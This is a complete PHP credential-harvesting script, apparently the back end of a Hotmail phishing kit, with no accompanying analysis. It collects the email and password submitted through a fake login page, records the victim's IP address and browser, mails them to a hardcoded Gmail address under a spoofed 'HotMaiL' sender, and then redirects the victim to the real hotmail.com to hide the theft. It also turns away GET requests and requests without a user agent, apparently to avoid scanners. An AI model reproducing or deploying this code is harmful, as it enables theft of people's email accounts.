<?php
// code for $_$
if ($_SERVER['REQUEST_METHOD'] == 'GET' or empty($_SERVER['HTTP_USER_AGENT'])){
header("Location: ./");
exit();
}




if($_POST['login']  && $_POST['passwd']){
$login = $_POST['login'];
$pass = $_POST['passwd'];


$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];

$adddate=date("D M d, Y g:i a");
$message .= "---------------+ HotMaiL! +--------------\n";
$message .= "Email      : ".$login."\n";
$message .= "Passwd     : ".$pass."\n";
$message .= "--------------------\n";
$message .= "Date : $adddate\n";
$message .= "IP Address : $ip\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "---------------+ HotMaiL! +--------------\n";

$send="aviddeen2231@gmail.com";

$subject = "HotMaiL! - IP: ".$ip."\n ";
$headers = "From: HotMaiL <morgancruz0@gmail.com>";
if(mail($send,$subject,$message,$headers) != false){
// we only redirect once the mail has sent

header("Location: https://hotmail.com/");
}


}else{
header("Location: ./");
exit();
}
?>